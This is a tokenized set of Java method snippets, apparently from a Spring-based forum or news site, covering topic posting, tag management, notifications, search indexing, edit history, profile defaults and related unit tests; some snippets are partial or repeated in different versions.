private ModelAndView createNewTopic ( HttpServletRequest request , AddTopicRequest form , HttpSession session , Group group , Map < String , Object > params , Section section , User user , String message , Screenshot scrn , Topic previewMsg ) throws IOException , ScriptErrorException { session . removeAttribute ( " image " ) ; int msgid = topicService . addMessage ( request , form , message , group , user , scrn , previewMsg ) ; if ( ! previewMsg . isDraft ( ) ) { searchQueueSender . updateMessageOnly ( msgid ) ; } String messageUrl = " view-message.jsp?msgid= " + msgid ; if ( ! section . isPremoderated ( ) | | previewMsg . isDraft ( ) ) { return new ModelAndView ( new RedirectView ( messageUrl ) ) ; } params . put ( " moderated " , section . isPremoderated ( ) ) ; params . put ( " url " , messageUrl ) ; return new ModelAndView ( " add-done-moderated " , params ) ; } 
public void delete ( String tagName , String newTagName , Errors errors ) { try { int oldTagId = tagService . getTagId ( tagName ) ; 
public List < Topic > getTopicsFeed ( Section section , Group group , String tag , Integer offset , Integer year , Integer month , int count ) throws TagNotFoundException { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . toString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . toString ( ) : " (null) " ) . append ( " ; tag= " ) . append ( tag ) . append ( " ; offset= " ) . append ( offset ) . append ( " ; year= " ) . append ( year ) . append ( " ; month= " ) . append ( month ) . toString ( ) ) ; TopicListDto topicListDto = new TopicListDto ( ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } if ( tag ! = null ) { topicListDto . setTag ( tagService . getTagId ( tag ) ) ; } if ( month ! = null & & year ! = null ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 , 0 , 0 , 0 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; topicListDto . setToDate ( calendar . getTime ( ) ) ; } else { topicListDto . setLimit ( count ) ; topicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( tag = = null & & group = = null & & ! section . isPremoderated ( ) ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return topicListDao . getTopics ( topicListDto ) ; } 
private void addToReplaceHandlerList ( ) { agModificationService . getActionHandlers ( ) . add ( actionHandler ) ; } 
public int favoriteDel ( User user , String tagName ) throws TagNotFoundException { int tagId = tagService . getTagId ( tagName ) ; userTagDao . deleteTag ( user . getId ( ) , tagId , true ) ; return tagId ; } 
public void prefixTopSearchExactTest ( ) { tagDao . createTag ( " zest " ) ; tagDao . createTag ( " zesd " ) ; Seq < String > tags = tagDao . getTopTagsByPrefix ( " zest " , 0 , 20 ) ; assertEquals ( 1 , tags . size ( ) ) ; } 
public boolean canCreateTag ( Section section , User user ) { if ( section . isPremoderated ( ) ) { return true ; } return user ! = null & & user . getScore ( ) > = CREATE_TAG_SCORE ; } 
public void testTagNotFound ( ) { Option < Object > fetch = tagDao . getTagId ( " fdsfsdfdsfsdfs " ) ; assertTrue ( fetch . isEmpty ( ) ) ; } 
public void createAndGetTest ( ) { int id = tagDao . createTag ( " test-tag " ) ; Option < Object > fetchId = tagDao . getTagId ( " test-tag " ) ; assertEquals ( Option . apply ( ( Object ) id ) , fetchId ) ; } 
public void resetTagDaoMock ( ) { reset ( tagDao ) ; when ( tagDao . getTagId ( anyString ( ) ) ) . thenReturn ( noneInt ) ; when ( tagDao . getTagId ( anyString ( ) ) ) . thenReturn ( noneInt ) ; } 
public void changeTest ( ) throws Exception { when ( tagDao . getTagId ( " testTag " ) ) . thenReturn ( Option . apply ( ( Object ) 123 ) ) ; when ( tagDao . getTagId ( " testNewTag " ) ) . thenReturn ( Option . apply ( ( Object ) 456 ) ) ; prepareChangeDataBinder ( ) ; agModificationService . change ( " InvalidTestTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; agModificationService . change ( " testTag " , " #$%@@#%$ " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; agModificationService . change ( " #$%@@#%$ " , " testNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; agModificationService . change ( " testTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; resetTagDaoMock ( ) ; when ( tagDao . getTagId ( " testTag " ) ) . thenReturn ( Option . apply ( ( Object ) 123 ) ) ; when ( tagDao . getTagId ( " testNewTag " ) ) . thenReturn ( noneInt ) ; prepareChangeDataBinder ( ) ; agModificationService . change ( " testTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertFalse ( binder . getBindingResult ( ) . hasErrors ( ) ) ; } 
public void deleteTest ( ) throws Exception { when ( tagDao . getTagId ( " testTag " ) ) . thenReturn ( Option . apply ( ( Object ) 123 ) ) ; when ( tagDao . getTagId ( " InvalidTestTag " ) ) . thenReturn ( noneInt ) ; prepareDeleteDataBinder ( ) ; agModificationService . delete ( " InvalidTestTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; agModificationService . delete ( " testTag " , " #$%@@#%$ " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; agModificationService . delete ( " testTag " , " testTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; agModificationService . delete ( " testTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertFalse ( binder . getBindingResult ( ) . hasErrors ( ) ) ; } 
public void resetMockObjects ( ) throws Exception { reset ( userTagDao ) ; reset ( tagService ) ; when ( tagService . getTagId ( " tag1 " ) ) . thenReturn ( 2 ) ; user = getUser ( 1 ) ; } 
public void favoriteAddTest ( ) throws TagNotFoundException { when ( tagDao . getTagId ( " tag1 " ) ) . thenReturn ( Option . apply ( ( Object ) 2 ) ) ; userTagService . favoriteAdd ( user , " tag1 " ) ; verify ( userTagDao ) . addTag ( eq ( 1 ) , eq ( 2 ) , eq ( true ) ) ; } 
public ModelAndView showTagListHandler ( @PathVariable String firstLetter ) throws TagNotFoundException { ModelAndView modelAndView = new ModelAndView ( " tags " ) ; Collection < String > firstLetters = tagService . getFirstLetters ( ) ; modelAndView . addObject ( " firstLetters " , firstLetters ) ; if ( Strings . isNullOrEmpty ( firstLetter ) ) { firstLetter = firstLetters . iterator ( ) . next ( ) ; } modelAndView . addObject ( " currentLetter " , firstLetter ) ; Map < TagRef , Integer > tags = tagService . getTagsByPrefix ( firstLetter , 1 ) ; if ( tags . isEmpty ( ) ) { throw new TagNotFoundException ( " Tag list is empty " ) ; } modelAndView . addObject ( " tags " , tags ) ; return modelAndView ; } 
public ModelAndView tagPage ( HttpServletRequest request , @PathVariable String tag ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! TagName . isGoodTag ( tag ) ) { throw new TagNotFoundException ( ) ; } ModelAndView mv = new ModelAndView ( " tag-page " ) ; mv . addObject ( " tag " , tag ) ; mv . addObject ( " title " , WordUtils . capitalize ( tag ) ) ; TagInfo tagInfo = tagService . getTagInfo ( tag , true ) ; mv . addObject ( " counter " , tagInfo . topicCount ( ) ) ; if ( tmpl . isSessionAuthorized ( ) ) { mv . addObject ( " showFavoriteTagButton " , ! userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; mv . addObject ( " showUnFavoriteTagButton " , userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; } int tagId = tagInfo . id ( ) ; mv . addObject ( " favsCount " , userTagService . countFavs ( tagId ) ) ; List < TagRef > relatedTags = tagService . getRelatedTags ( tagId ) ; if ( relatedTags . size ( ) > 1 ) { mv . addObject ( " relatedTags " , relatedTags ) ; } mv . addAllObjects ( getNewsSection ( request , tag ) ) ; mv . addAllObjects ( getGallerySection ( tag , tagId , tmpl ) ) ; mv . addAllObjects ( getForumSection ( tag , tagId ) ) ; return mv ; } 
public void logScore50 ( @Nonnull User user , @Nonnull User moderator ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, '') " , 
public void testLogScore50 ( ) { User user = mock ( User . class ) ; when ( user . getId ( ) ) . thenReturn ( UserDaoIntegrationTest . TEST_ID ) ; userLogDao . logScore50 ( user , user ) ; List < UserLogItem > logItems = userLogDao . getLogItems ( user , true ) ; Assert . assertEquals ( 1 , logItems . size ( ) ) ; UserLogItem item = logItems . get ( 0 ) ; assertNotNull ( item ) ; assertEquals ( UserLogAction . SCORE50 , item . getAction ( ) ) ; } 
public Boolean enableHsts ( ) { String property = properties . getProperty ( " EnableHsts " ) ; if ( property = = null ) { return false ; } return Boolean . valueOf ( property ) ; } 
private static boolean sendTagEventsNeeded ( Section section , Topic oldMsg , boolean commit ) { boolean needCommit = section . isPremoderated ( ) & & ! oldMsg . isCommited ( ) ; boolean fresh = oldMsg . getEffectiveDate ( ) . isAfter ( DateTime . now ( ) . minusMonths ( 1 ) ) ; return commit | | ( ! needCommit & & fresh ) ; } 
private void updateMessage ( Topic topic ) { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( topic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( topic . getGroupId ( ) ) ; User author = userDao . getUserCached ( topic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " topic_author " , author . getNick ( ) ) ; doc . put ( " topic_id " , topic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; doc . put ( " title " , topic . getTitleUnescaped ( ) ) ; doc . put ( " topic_title " , topic . getTitleUnescaped ( ) ) ; doc . put ( " message " , lorCodeService . extractPlainText ( msgbaseDao . getMessageText ( topic . getId ( ) ) ) ) ; Date postdate = topic . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " tag " , topicTagService . getTags ( topic ) ) ; doc . put ( " is_comment " , false ) ; client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . toString ( topic . getId ( ) ) ) 
private IndexRequestBuilder processComment ( Topic topic , Comment comment , String message ) { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( topic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( topic . getGroupId ( ) ) ; User author = userDao . getUserCached ( comment . getUserid ( ) ) ; User topicAuthor = userDao . getUserCached ( topic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " topic_author " , topicAuthor . getNick ( ) ) ; doc . put ( " topic_id " , topic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; String topicTitle = topic . getTitleUnescaped ( ) ; doc . put ( " topic_title " , topicTitle ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle ! = null & & ! commentTitle . isEmpty ( ) & & ! commentTitle . equals ( topicTitle ) & & ! commentTitle . startsWith ( " Re: " ) ) { doc . put ( " title " , StringEscapeUtils . unescapeHtml ( commentTitle ) ) ; } doc . put ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " tag " , topicTagService . getTags ( topic ) ) ; doc . put ( " is_comment " , true ) ; return client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . toString ( comment . getId ( ) ) ) 
public void toggleCorrector ( User user , User moderator ) { if ( user . canCorrect ( ) ) { jdbcTemplate . update ( " UPDATE users SET corrector='f' WHERE id=? " , user . getId ( ) ) ; 
public void unsetCorrector ( @Nonnull User user , @Nonnull User moderator ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public Client elasticsearch ( ) { Client mockClient = Mockito . mock ( Client . class ) ; Mockito . when ( mockClient . prepareSearch ( Matchers . anyString ( ) ) ) . thenThrow ( new ElasticsearchException ( " no ES here " ) ) ; return mockClient ; } 
public static UserEventFilterEnum fromNameOrDefault ( String filterAction ) { if ( VALUES . contains ( filterAction ) ) { return UserEventFilterEnum . valueOf ( filterAction . toUpperCase ( ) ) ; 
public RedirectView resetNotifications ( HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " not authorized " ) ; } User currentUser = tmpl . getCurrentUser ( ) ; userEventService . resetUnreadReplies ( currentUser ) ; RedirectView view = new RedirectView ( " /notifications " ) ; view . setExposeModelAttributes ( false ) ; return view ; } 
public ModelAndView showNotifications ( HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , defaultValue = " all " ) String filter , @RequestParam ( value = " offset " , defaultValue = " 0 " ) int offset ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " not authorized " ) ; } Map < String , Object > params = new HashMap < > ( ) ; UserEventFilterEnum eventFilter = UserEventFilterEnum . fromNameOrDefault ( filter ) ; params . put ( " filter " , eventFilter . getName ( ) ) ; User currentUser = tmpl . getCurrentUser ( ) ; String nick = currentUser . getNick ( ) ; params . put ( " nick " , nick ) ; if ( eventFilter ! = UserEventFilterEnum . ALL ) { params . put ( " addition_query " , " &filter= " + eventFilter . getName ( ) ) ; } else { params . put ( " addition_query " , " " ) ; } if ( offset < 0 ) { offset = 0 ; } boolean firstPage = offset = = 0 ; int topics = tmpl . getProf ( ) . getTopics ( ) ; if ( topics > 200 ) { topics = 200 ; } params . put ( " firstPage " , firstPage ) ; params . put ( " topics " , topics ) ; params . put ( " offset " , offset ) ; params . put ( " disable_event_header " , true ) ; long time = System . currentTimeMillis ( ) ; int delay = firstPage ? 90 : 60 * 60 ; response . setDateHeader ( " Expires " , time + 1000 * delay ) ; params . put ( " unreadCount " , currentUser . getUnreadEvents ( ) ) ; params . put ( " isMyNotifications " , true ) ; response . addHeader ( " Cache-Control " , " no-cache " ) ; List < UserEvent > list = userEventService . getRepliesForUser ( currentUser , true , topics , offset , eventFilter ) ; List < PreparedUserEvent > prepared = userEventService . prepare ( list , false , request . isSecure ( ) ) ; params . put ( " enableReset " , true ) ; params . put ( " topicsList " , prepared ) ; params . put ( " hasMore " , list . size ( ) = = topics ) ; return new ModelAndView ( " show-replies " , params ) ; } 
public String resetNotifications ( HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " not authorized " ) ; } User currentUser = tmpl . getCurrentUser ( ) ; userEventService . resetUnreadReplies ( currentUser ) ; return " ok " ; } 
public RedirectView resetNotifications ( HttpServletRequest request ) throws Exception { apiController . resetNotifications ( request ) ; RedirectView view = new RedirectView ( " /notifications " ) ; view . setExposeModelAttributes ( false ) ; return view ; } 
public List < Topic > getTopicsFeed ( Section section , Group group , String tag , Integer offset , Integer year , Integer month , int count ) throws TagNotFoundException { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . toString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . toString ( ) : " (null) " ) . append ( " ; tag= " ) . append ( tag ) . append ( " ; offset= " ) . append ( offset ) . append ( " ; year= " ) . append ( year ) . append ( " ; month= " ) . append ( month ) . toString ( ) ) ; TopicListDto topicListDto = new TopicListDto ( ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } if ( tag ! = null ) { topicListDto . setTag ( tagService . getTagId ( tag ) ) ; } if ( month ! = null & & year ! = null ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 , 0 , 0 , 0 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; topicListDto . setToDate ( calendar . getTime ( ) ) ; } else { topicListDto . setLimit ( count ) ; topicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( tag = = null & & group = = null & & ! section . isPremoderated ( ) ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return topicListDao . getTopics ( topicListDto ) ; } 
public List < Topic > getRssTopicsFeed ( Section section , Group group , Date fromDate , boolean noTalks , boolean tech , boolean feedBurner ) { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getRssTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . toString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . toString ( ) : " (null) " ) . append ( " ; fromDate= " ) . append ( fromDate ) . append ( " ; noTalks= " ) . append ( noTalks ) . append ( " ; tech= " ) . append ( tech ) . append ( " ; feedBurner= " ) . append ( feedBurner ) . toString ( ) ) ; TopicListDto topicListDto = new TopicListDto ( ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } topicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; topicListDto . setFromDate ( fromDate ) ; topicListDto . setNotalks ( noTalks ) ; topicListDto . setTech ( tech ) ; topicListDto . setLimit ( 20 ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } return ( feedBurner ) ? topicListDao . getTopics ( topicListDto ) 
public List < Topic > getAllTopicsFeed ( Section section , Date fromDate ) { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getAllTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . toString ( ) : " (null) " ) . append ( " ; fromDate= " ) . append ( fromDate ) . toString ( ) ) ; TopicListDto topicListDto = new TopicListDto ( ) ; topicListDto . setCommitMode ( TopicListDao . CommitMode . UNCOMMITED_ONLY ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; } topicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; topicListDto . setFromDate ( fromDate ) ; return topicListDao . getTopics ( topicListDto ) ; } 
Object getFromCache ( String key ) ; < T > void storeToCache ( String key , T value ) ; } 
private ApiDeleteInfo loadDeleteInfo ( Comment comment ) throws UserNotFoundException { ApiDeleteInfo deleteInfo = null ; if ( comment . isDeleted ( ) ) { DeleteInfo info = deleteInfoDao . getDeleteInfo ( comment . getId ( ) ) ; if ( info ! = null ) { deleteInfo = new ApiDeleteInfo ( userDao . getUserCached ( info . getUserid ( ) ) . getNick ( ) , info . getReason ( ) ) ; } } return deleteInfo ; } 
public void processRow ( ResultSet resultSet ) throws SQLException { EditHistoryDto editHistoryDto = new EditHistoryDto ( ) ; editHistoryDto . setId ( resultSet . getInt ( " id " ) ) ; editHistoryDto . setMsgid ( resultSet . getInt ( " msgid " ) ) ; editHistoryDto . setEditor ( resultSet . getInt ( " editor " ) ) ; editHistoryDto . setOldmessage ( resultSet . getString ( " oldmessage " ) ) ; editHistoryDto . setEditdate ( resultSet . getTimestamp ( " editdate " ) ) ; editHistoryDto . setOldtitle ( resultSet . getString ( " oldtitle " ) ) ; editHistoryDto . setOldtags ( resultSet . getString ( " oldtags " ) ) ; editHistoryDto . setObjectType ( resultSet . getString ( " object_type " ) ) ; editHistoryDto . setOldimage ( resultSet . getInt ( " oldimage " ) ) ; if ( resultSet . wasNull ( ) ) { editHistoryDto . setOldimage ( null ) ; } editHistoryDto . setOldminor ( resultSet . getBoolean ( " oldminor " ) ) ; if ( resultSet . wasNull ( ) ) { editHistoryDto . setOldminor ( null ) ; } editInfoDTOs . add ( editHistoryDto ) ; } 
private void updateLatestEditorInfo ( User editor , Comment original , Comment comment ) { int editCount = editHistoryService . editCount ( original . getId ( ) , EditHistoryObjectTypeEnum . COMMENT ) ; commentDao . updateLatestEditorInfo ( original . getId ( ) , 
public int editCount ( int id , EditHistoryObjectTypeEnum objectTypeEnum ) { TODO replace with count() SQL query return editHistoryDao.getEditInfo(id, objectTypeEnum).size(); } 
public EditInfoSummary editInfoSummary ( int id , EditHistoryObjectTypeEnum objectTypeEnum ) { TODO do not load full history here List<EditHistoryDto> history = editHistoryDao.getEditInfo(id, objectTypeEnum); if (history.isEmpty()) { return EditInfoSummary.NoEdits(); 
public Integer apply ( EditHistoryDto input ) { return input . getEditor ( ) ; } 
public BriefEditInfo mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new BriefEditInfo ( rs . getTimestamp ( " editdate " ) , rs . getInt ( " editor " ) ) ; } 
public EditInfoSummary editInfoSummary ( int id , EditHistoryObjectTypeEnum objectTypeEnum ) { List < BriefEditInfo > history = editHistoryDao . getBriefEditInfo ( id , objectTypeEnum ) ; if ( history . isEmpty ( ) ) { return EditInfoSummary . NoEdits ( ) ; 
public View trackerOldUrl ( @RequestParam ( value = " filter " , defaultValue = " all " ) String filterAction ) throws Exception { RedirectView redirectView = new RedirectView ( " /tracker/ " ) ; redirectView . setExposeModelAttributes ( false ) ; Optional < TrackerFilterEnum > filter = TrackerFilterEnum . getByValue ( filterAction ) ; if ( filter . isPresent ( ) & & filter . get ( ) ! = DEFAULT_FILTER ) { redirectView . setUrl ( " /tracker/?filter= " + URLEncoder . encode ( filterAction , " UTF-8 " ) ) ; } return redirectView ; } 
public Tuple2 < Timestamp , Timestamp > mapRow ( ResultSet resultSet , int i ) throws SQLException { return new Tuple2 < > ( resultSet . getTimestamp ( " first " ) , resultSet . getTimestamp ( " last " ) ) ; } 
public Tuple2 < Timestamp , Timestamp > mapRow ( ResultSet resultSet , int i ) throws SQLException { return new Tuple2 ( resultSet . getTimestamp ( " first " ) , resultSet . getTimestamp ( " last " ) ) ; } 
public UsersSectionStatEntry mapRow ( ResultSet resultSet , int i ) throws SQLException { return new UsersSectionStatEntry ( resultSet . getInt ( " section " ) , resultSet . getInt ( " c " ) ) ; } 
public ModelAndView mainPage ( HttpServletRequest request , HttpServletResponse response ) { Template tmpl = Template . getTemplate ( request ) ; response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) - 20 * 3600 * 1000 ) ; response . setDateHeader ( " Last-Modified " , System . currentTimeMillis ( ) - 2 * 1000 ) ; List < Topic > messages = topicListService . getMainPageFeed ( tmpl . getProf ( ) . isShowGalleryOnMain ( ) ) ; ModelAndView mv = new ModelAndView ( " index " ) ; Profile profile = tmpl . getProf ( ) ; mv . getModel ( ) . put ( " news " , prepareService . prepareMessagesForUser ( profile . isMiniNewsBoxletOnMainPage ( ) ? filterMiniNews ( messages ) : messages , request . isSecure ( ) , tmpl . getCurrentUser ( ) , profile , false ) ) ; if ( tmpl . isSessionAuthorized ( ) ) { mv . getModel ( ) . put ( " hasDrafts " , topicDao . hasDrafts ( tmpl . getCurrentUser ( ) ) ) ; mv . getModel ( ) . put ( " favPresent " , memoriesDao . isFavPresetForUser ( tmpl . getCurrentUser ( ) ) ) ; } if ( tmpl . isModeratorSession ( ) | | tmpl . isCorrectorSession ( ) ) { int uncommited = topicDao . getUncommitedCount ( ) ; mv . getModel ( ) . put ( " uncommited " , uncommited ) ; int uncommitedNews = 0 ; if ( uncommited > 0 ) { uncommitedNews = topicDao . getUncommitedCount ( Section . SECTION_NEWS ) ; } mv . getModel ( ) . put ( " uncommitedNews " , uncommitedNews ) ; } mv . getModel ( ) . put ( " showAdsense " , ! tmpl . isSessionAuthorized ( ) | | ! tmpl . getProf ( ) . isHideAdsense ( ) ) ; return mv ; } 
public static void updateLastLogin ( Authentication authentication , UserDao userDao ) { if ( authentication ! = null & & ( authentication . isAuthenticated ( ) ) ) { Object principal = authentication . getPrincipal ( ) ; 
private static String fixFormat ( String mode ) { if ( ! " quot " . equals ( mode ) & & ! " ntobr " . equals ( mode ) & & ! " lorcode " . equals ( mode ) ) { return ( String ) DefaultProfile . getDefaultProfile ( ) . get ( " format.mode " ) ; } return mode ; } 
private static String fixStyle ( String style ) { if ( ! DefaultProfile . isStyle ( style ) ) { return ( String ) DefaultProfile . getDefaultProfile ( ) . get ( STYLE_PROPERTY ) ; } return style ; } 
public static Profile createDefault ( ) { return new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , new HashMap < String , String > ( ) ) , null ) ; } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; builder . put ( HOVER_PROPERTY , Boolean . TRUE ) ; builder . put ( STYLE_PROPERTY , " tango " ) ; builder . put ( FORMAT_MODE_PROPERTY , " quot " ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , true ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( SHOW_SOCIAL_PROPERTY , true ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of( "poll", "top10", "gallery", "tagcloud", "archive", "ibm" ); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
public View trackerOldUrl ( @RequestParam ( value = " filter " , defaultValue = " all " ) String filterAction , HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; TrackerFilterEnum defaultFilter = tmpl . getProf ( ) . getTrackerMode ( ) ; RedirectView redirectView = new RedirectView ( " /tracker/ " ) ; redirectView . setExposeModelAttributes ( false ) ; Optional < TrackerFilterEnum > filter = TrackerFilterEnum . getByValue ( filterAction ) ; if ( filter . isPresent ( ) & & filter . get ( ) ! = defaultFilter ) { redirectView . setUrl ( " /tracker/?filter= " + URLEncoder . encode ( filterAction , " UTF-8 " ) ) ; } return redirectView ; } 
public ArchiveDTO mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new ArchiveDTO ( section , group , rs . getInt ( " year " ) , rs . getInt ( " month " ) , rs . getInt ( " c " ) ) ; } 
protected ModelAndView getData ( HttpServletRequest request ) throws Exception { List < ArchiveDao . ArchiveStats > list = archiveDao . getLatestArchiveStats ( sectionNews , 13 ) ; return new ModelAndView ( " boxlets/archive " , " items " , list ) ; } 
public ModelAndView archiveList ( int sectionid , String groupName ) throws Exception { ModelAndView mv = new ModelAndView ( " view-news-archive " ) ; Section section = sectionService . getSection ( sectionid ) ; mv . getModel ( ) . put ( " section " , section ) ; Group group = null ; if ( groupName ! = null ) { group = groupDao . getGroup ( section , groupName ) ; } mv . getModel ( ) . put ( " group " , group ) ; List < ArchiveDao . ArchiveStats > items = archiveDao . getArchiveStats ( section , group ) ; mv . getModel ( ) . put ( " items " , items ) ; return mv ; } 
private RowMapper < ArchiveStats > mapper ( final Section section , final Group group ) { return new RowMapper < ArchiveStats > ( ) { @Override 
public ArchiveStats mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new ArchiveStats ( section , group , rs . getInt ( " year " ) , rs . getInt ( " month " ) , rs . getInt ( " c " ) ) ; } 
private void reindexMessage ( int msgid , boolean withComments ) throws MessageNotFoundException { Topic msg = topicDao . getById ( msgid ) ; if ( ! msg . isDeleted ( ) & & ! msg . isDraft ( ) ) { updateMessage ( msg ) ; } else { client . prepareDelete ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . toString ( msg . getId ( ) ) ) . execute ( ) . actionGet ( ) ; logger.info("Deleting message "+msgid); } if (withComments) { CommentList commentList = commentService.getCommentList(msg, true); 
private boolean isTopicVisible ( Topic msg ) { Section section = sectionService . getSection ( msg . getSectionId ( ) ) ; if ( section . isPremoderated ( ) & & ! msg . isCommited ( ) ) { return false ; } return ! msg . isDeleted ( ) & & ! msg . isDraft ( ) ; } 
private void reindexMessage ( int msgid , boolean withComments ) throws MessageNotFoundException { Topic msg = topicDao . getById ( msgid ) ; if ( isTopicVisible ( msg ) ) { updateMessage ( msg ) ; 
